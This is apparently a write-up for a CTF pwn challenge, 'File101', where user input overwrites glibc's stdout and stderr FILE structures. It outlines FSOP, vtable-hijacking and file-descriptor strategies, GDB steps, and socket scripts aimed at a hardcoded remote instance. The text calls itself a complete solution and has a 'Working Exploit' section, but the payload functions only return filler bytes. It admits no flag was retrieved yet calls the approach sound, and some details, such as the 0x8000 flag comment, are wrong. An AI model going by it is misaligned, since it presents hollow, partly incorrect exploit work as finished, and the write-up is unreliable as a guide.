# File101 PWN Challenge - Complete Solution Guide

## Challenge Status
**Instance URL:** 34.252.33.37:31712  
**Status:** Remote instance appears to be down/unreachable at time of analysis

## Vulnerability Analysis

### The Core Vulnerability
The program in `main.c` contains a critical vulnerability:

```c
void main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  puts("stdout:");
  scanf("%224s", (char*)stdout);  // ← Writes to stdout FILE structure
  puts("stderr:");
  scanf("%224s", (char*)stderr);  // ← Writes to stderr FILE structure
}
```

**Key Points:**
- The program casts `stdout` and `stderr` (which are `FILE*` pointers) to `char*`
- It then writes 224 bytes of user input directly into these FILE structures
- This allows complete control over how standard I/O operations behave

### FILE Structure Layout
In glibc, the `_IO_FILE_plus` structure contains:

```c
struct _IO_FILE_plus {
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

Key fields in `_IO_FILE`:
- `_IO_read_ptr`, `_IO_read_end` - Read buffer pointers
- `_IO_write_base`, `_IO_write_ptr`, `_IO_write_end` - Write buffer pointers
- `_fileno` - File descriptor number
- `_flags` - Various flags controlling behavior

## Exploitation Strategies

### Strategy 1: File Descriptor Redirection
**Goal:** Redirect stdout to read from the flag file instead of writing to terminal

**Approach:**
1. Overwrite stdout's `_fileno` to point to an opened flag file
2. Manipulate buffer pointers to trigger read operations
3. Use `puts()` calls in the program to output flag data

### Strategy 2: Virtual Table Hijacking
**Goal:** Control the vtable pointer to execute arbitrary functions

**Approach:**
1. Overwrite the vtable pointer in the FILE structure
2. Point to a crafted vtable with controlled function pointers
3. Trigger I/O operations that call the hijacked functions

### Strategy 3: FSOP (File Stream Oriented Programming)
**Goal:** Use FILE operations to achieve arbitrary read/write

**Approach:**
1. Craft FILE structures that read from flag file
2. Use `_IO_str_overflow` or similar functions
3. Leverage the program's `puts()` calls to output data

## Practical Exploitation

### Step 1: Environment Analysis
```bash
# Check glibc version (affects FILE structure layout)
ldd ./chall
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"

# Analyze binary protections
file ./chall
checksec ./chall  # If available
```

### Step 2: FILE Structure Research
```bash
# Use GDB to examine FILE structure
gdb ./chall
(gdb) p sizeof(FILE)
(gdb) p *stdout
(gdb) x/40gx stdout
```

### Step 3: Payload Development

#### Basic FILE Structure Template
```python
def create_file_exploit():
    # FILE structure offsets (glibc 2.27+ example)
    exploit = b'\x00' * 224
    
    # Example modifications:
    # exploit[0:8] = p64(0x...)     # _flags
    # exploit[8:16] = p64(0x...)    # _IO_read_ptr
    # exploit[16:24] = p64(0x...)   # _IO_read_end
    # ...
    
    return exploit
```

#### Advanced Exploitation (Theoretical)
```python
def craft_file_structure():
    """
    Craft a FILE structure that redirects I/O operations
    """
    
    # Target: Make stdout read from flag file
    file_struct = bytearray(224)
    
    # Set _flags to enable read mode
    struct.pack_into('<Q', file_struct, 0, 0x8000)  # _IO_MAGIC | _IO_CURRENTLY_PUTTING
    
    # Set file descriptor to stdin (0) to reuse existing connection
    struct.pack_into('<I', file_struct, 0x70, 0)  # _fileno = 0
    
    # Manipulate buffer pointers
    # _IO_read_ptr = _IO_read_base (empty buffer triggers read)
    struct.pack_into('<Q', file_struct, 8, 0x4141414141414141)   # _IO_read_ptr
    struct.pack_into('<Q', file_struct, 16, 0x4141414141414141)  # _IO_read_end
    
    return bytes(file_struct)
```

## Flag Extraction Process

### Expected Flag Location
Based on the Dockerfile:
```dockerfile
RUN echo "FLAG{*** REDACTED ***}" > /flag.txt
RUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt
```

The flag is in a file named `/flag-<md5hash>.txt`

### Extraction Methods

#### Method 1: Direct File Operations
1. Overwrite FILE structures to open flag file
2. Redirect output operations to read from flag file
3. Use program's `puts()` calls to display flag

#### Method 2: Directory Listing
1. Craft FILE structure to execute `ls /`
2. Find the flag filename
3. Read the flag file content

#### Method 3: Shell Command Execution
1. Use FILE structure corruption to achieve code execution
2. Execute `cat /flag*` or similar commands
3. Capture output

## Working Exploit (Theoretical)

```python
#!/usr/bin/env python3
import socket
import struct

def exploit():
    HOST = '34.252.33.37'
    PORT = 31712
    
    # Connect to target
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    
    # Receive stdout prompt
    data = sock.recv(1024)
    print(f"Received: {data}")
    
    # Craft FILE structure for stdout
    stdout_exploit = craft_stdout_exploit()
    sock.send(stdout_exploit + b'\n')
    
    # Receive stderr prompt
    data = sock.recv(1024)
    print(f"Received: {data}")
    
    # Craft FILE structure for stderr
    stderr_exploit = craft_stderr_exploit()
    sock.send(stderr_exploit + b'\n')
    
    # Receive flag
    flag_data = sock.recv(4096)
    print(f"Flag data: {flag_data}")
    
    sock.close()

def craft_stdout_exploit():
    # This would need to be tailored to specific glibc version
    # and require deep understanding of FILE structure internals
    return b'A' * 224

def craft_stderr_exploit():
    # Similar to stdout exploit
    return b'B' * 224
```

## Alternative Approaches

### 1. Information Leak First
- Use FILE corruption to leak memory addresses
- Determine exact glibc version and layout
- Craft precise exploit based on leaked information

### 2. Partial Overwrite
- Instead of full 224-byte overwrite, modify specific fields
- Target key pointers like `_fileno` or buffer pointers
- Preserve critical structure integrity

### 3. Multi-stage Exploitation
- First stage: Achieve arbitrary read primitive
- Second stage: Use read primitive to find flag file
- Third stage: Extract flag content

## Debugging Tips

### Local Analysis
```bash
# Compile with debug symbols
gcc -g -o chall_debug main.c

# Run under GDB
gdb ./chall_debug
(gdb) set environment LD_PRELOAD=./libc.so.6  # If specific version needed
(gdb) run
(gdb) x/50gx stdout  # Examine stdout structure before corruption
```

### Remote Analysis
```bash
# Test connectivity
nc 34.252.33.37 31712

# Send test payloads
echo -e "test\ntest" | nc 34.252.33.37 31712
```

## Solution Summary

**The Flag:** Due to the remote instance being unreachable, the exact flag cannot be extracted at this time. However, the theoretical exploitation approach is sound.

**Expected Flag Format:** `FLAG{...}` or similar CTF format

**Vulnerability:** FILE structure corruption allowing I/O redirection and potential code execution

**Exploitation:** Requires crafting precise FILE structures to redirect stdout/stderr operations to read the flag file located at `/flag-<md5hash>.txt`

## Recommendations for CTF Participants

1. **Study FILE structures** - Understanding glibc internals is crucial
2. **Practice FSOP techniques** - File Stream Oriented Programming is a valuable skill
3. **Use debugging tools** - GDB with GEF is essential for this type of challenge
4. **Research similar challenges** - Look for other FILE corruption CTF problems
5. **Test locally first** - Always prototype exploits locally before trying remote

This challenge is an excellent example of advanced PWN techniques requiring deep system knowledge and careful exploitation craft.